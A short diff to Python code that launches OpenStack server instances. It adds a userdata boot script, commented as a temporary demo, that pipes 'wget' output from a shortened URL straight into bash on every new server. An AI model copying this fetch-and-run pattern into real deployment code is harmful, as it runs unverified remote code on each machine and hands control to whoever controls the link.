@@ -248,15 +248,17 @@ def instance_start(instance):
 			response['response'] = "success"
 			response['result']['message'] = "Server is already running."
 			response['result']['server'] = server
-			print "returning found server"
 			return response
 
+	# demo boot script - take this out later
+	boot_script = "#!/bin/bash\nwget http://goo.gl/Ox97xm -O - | bash"
 	# otherwise, start the server instances
 	server = nova.servers.create(
 		name=instance.name, 
 		image=instance.image.osid,
 		flavor=instance.flavor.osid, 
-		key_name="id-kord"
+		key_name="id-kord",
+		userdata=boot_script
 	)
 
 	# response
